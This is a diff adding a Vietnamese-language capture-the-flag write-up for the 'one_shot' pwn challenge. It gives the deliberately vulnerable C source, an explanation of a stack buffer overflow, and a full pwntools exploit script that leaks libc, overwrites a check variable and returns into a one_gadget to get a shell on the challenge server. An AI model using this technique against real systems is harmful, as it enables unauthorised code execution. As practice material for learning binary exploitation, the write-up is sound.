@@ -1288,5 +1288,141 @@ r.interactive()
 
 </details>
 
+# one_shot
 
-# abc
+## Source
+
+<details> <summary> Source </summary>
+
+```c
+// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(60);
+}
+
+int main(int argc, char *argv[]) {
+    char msg[16];
+    size_t check = 0;
+
+    initialize();
+
+    printf("stdout: %p\n", stdout);
+
+    printf("MSG: ");
+    read(0, msg, 46);
+
+    if(check > 0) {
+        exit(0);
+    }
+
+    printf("MSG: %s\n", msg);
+    memset(msg, 0, sizeof(msg));
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Bài này chủ yếu hướng dẫn chúng ta tạo shell bằng one_gadget, tuy nhiên chỉ khác một chút ở đây
+
+```c
+    if(check > 0) {
+        exit(0);
+    }
+```
+
+- Nó sẽ kiểm tra biến check, biến check trong stack `rbp-0x8`
+
+![image](https://user-images.githubusercontent.com/111769169/227836552-a392aab4-4d25-4f8c-ad72-aa28b3a2188a.png)
+
+- vậy ta sẽ ghi đè biến check là 0x0 để được ghi tiếp chương trình
+
+## Thực thi
+
+- Đầu tiên người ta cho chúng ta địa chỉ libc stdout
+- Ta cần dựa vào địa chỉ đó để tính ra địa chỉ base libc
+
+```python
+    r.recvuntil(b"stdout: ")
+    leak = int(r.recvline(keepends=False).decode(), 16)
+    libc.address = leak - 3954208
+    log.info("libc: " + hex(libc.address))
+```
+
+- Tiếp đó ta tìm gadget phù hợp ở đây em chọn gadget `0x45216`
+- Cuối cùng tạo payload, lưu ý do check nằm sau 24 kí tự "a" nên ta cần trả về 0 để tiếp tục chương trình
+
+```python
+    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
+    r.sendafter(b"MSG: ", payload)
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227837108-c5a3e799-f65a-433a-972d-806b5253b970.png)
+
+<details> <summary> full script </summary>
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./oneshot_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.23.so")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        gdb.attach(r, gdbscript='''
+                   b*main+138
+                   b*main+102
+                   c
+                   ''')
+    else:
+        r = remote("host3.dreamhack.games", 17120)
+
+    return r
+
+
+def main():
+    r = conn()
+    input()
+    r.recvuntil(b"stdout: ")
+    leak = int(r.recvline(keepends=False).decode(), 16)
+    libc.address = leak - 3954208
+    log.info("libc: " + hex(libc.address))
+
+    one_gadget = 0x45216
+    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
+    r.sendafter(b"MSG: ", payload)
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+</details>
+
+# abc 
